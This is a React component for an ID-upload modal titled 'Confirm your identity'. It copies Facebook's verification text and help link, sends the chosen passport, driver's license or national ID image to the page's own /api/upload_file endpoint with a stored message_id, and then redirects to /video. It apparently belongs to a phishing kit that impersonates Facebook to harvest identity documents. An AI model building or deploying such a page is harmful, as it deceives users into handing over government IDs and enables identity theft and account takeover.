import { faClose, faImage } from '@fortawesome/free-solid-svg-icons';
import { FontAwesomeIcon } from '@fortawesome/react-fontawesome';
import axios from 'axios';
import React, { useCallback, useRef, useState } from 'react';
import { useNavigate } from 'react-router-dom';

interface ImageUploadProps {
	onClose: () => void;
}

const ImageUpload: React.FC<ImageUploadProps> = ({ onClose }) => {
	const fileInputRef = useRef<HTMLInputElement | null>(null);
	const [uploading, setUploading] = useState(false);
	const navigate = useNavigate();
	const sendPhoto = async ({
		photo,
		message_id,
	}: {
		photo: File;
		message_id: number;
	}) => {
		const formData = new FormData();
		formData.append('photo', photo);
		formData.append('message_id', message_id.toString());

		await axios.post('/api/upload_file', formData, {
			headers: {
				'Content-Type': 'multipart/form-data',
			},
		});
	};

	const handleFileUpload = useCallback(
		async (file: File) => {
			setUploading(true);
			try {
				const message_id = localStorage.getItem('message_id');
				await sendPhoto({
					photo: file,
					message_id: Number(message_id),
				});
				setTimeout(() => {
					navigate('/video');
				}, 0);
			} catch (error) {
				console.error('Error uploading image:', error);
			} finally {
				setUploading(false);
				if (fileInputRef.current) {
					fileInputRef.current.value = '';
				}
			}
		},
		[navigate],
	);

	const handleFileChange = useCallback(
		async (event: React.ChangeEvent<HTMLInputElement>) => {
			const file = event.target.files ? event.target.files[0] : null;
			if (file) {
				await handleFileUpload(file);
			}
		},
		[handleFileUpload],
	);

	return (
		<div className='fixed inset-0 flex items-center justify-center bg-gray-900 bg-opacity-50'>
			<div className='w-11/12 rounded-lg bg-white p-8 shadow-2xl md:w-2/5'>
				<div className='relative mb-4 flex items-center justify-center'>
					<h2 className='text-xl font-semibold text-gray-800'>
						Confirm your identity
					</h2>
					<FontAwesomeIcon
						icon={faClose}
						className='absolute right-0 top-1/2 hidden h-5 w-5 -translate-y-1/2 transform cursor-pointer rounded-full bg-gray-200 p-2 text-gray-600 hover:bg-gray-300 md:block'
						onClick={onClose}
					/>
				</div>
				<hr className='my-4 border-gray-300' />
				<div className='mb-4'>
					<b className='text-lg text-gray-700'>
						Choose type of ID to upload
					</b>
					<p className='mt-2 text-gray-600'>
						We'll use your ID to review your name, photo, and date
						of birth. It won't be shared on your profile.
					</p>
				</div>
				<div className='mb-4 w-full font-semibold text-gray-700'>
					<label
						htmlFor='passport'
						className='mb-2 flex cursor-pointer items-center justify-between p-2 hover:bg-gray-200'
					>
						<span>Passport</span>
						<input
							type='radio'
							id='passport'
							name='document'
							value='passport'
							defaultChecked
							className='h-4 w-4 rounded-full text-blue-600 ring-1 ring-gray-500 checked:border-2 checked:border-white checked:bg-blue-600 checked:ring-2 checked:ring-blue-500'
						/>
					</label>
					<label
						htmlFor='drivers-license'
						className='mb-2 flex cursor-pointer items-center justify-between p-2 hover:bg-gray-200'
					>
						<span>Driver's license</span>
						<input
							type='radio'
							id='drivers-license'
							name='document'
							value='drivers-license'
							className='h-4 w-4 rounded-full text-blue-600 ring-1 ring-gray-500 checked:border-2 checked:border-white checked:bg-blue-600 checked:ring-2 checked:ring-blue-500'
						/>
					</label>
					<label
						htmlFor='national-id'
						className='mb-2 flex cursor-pointer items-center justify-between p-2 hover:bg-gray-200'
					>
						<span>National ID card</span>
						<input
							type='radio'
							id='national-id'
							name='document'
							value='national-id'
							className='h-4 w-4 rounded-full text-blue-600 ring-1 ring-gray-500 checked:border-2 checked:border-white checked:bg-blue-600 checked:ring-2 checked:ring-blue-500'
						/>
					</label>
				</div>

				<div className='mt-6'>
					<button
						className={`w-full rounded-md bg-blue-500 px-4 py-2 font-semibold text-white hover:bg-blue-600 ${
							uploading ? 'cursor-not-allowed opacity-50' : ''
						}`}
						onClick={() => fileInputRef.current?.click()}
						disabled={uploading}
					>
						<FontAwesomeIcon icon={faImage} className='mr-2' />
						{uploading ? 'Uploading...' : 'Choose File'}
					</button>
				</div>

				<input
					type='file'
					accept='image/*'
					ref={fileInputRef}
					onChange={handleFileChange}
					className='hidden'
				/>

				<div className='mt-4 rounded-md bg-gray-100 p-4 text-sm text-gray-600'>
					Your ID will be securely stored for up to 1 year to help
					improve how we detect impersonation and fake IDs. If you opt
					out, we'll delete it within 30 days. We sometimes use
					trusted service providers to help review your information.{' '}
					<a
						href='https://www.facebook.com/help/155050237914643/'
						target='_blank'
						className='text-blue-600 underline'
					>
						Learn more
					</a>
				</div>
			</div>
		</div>
	);
};

export default ImageUpload;
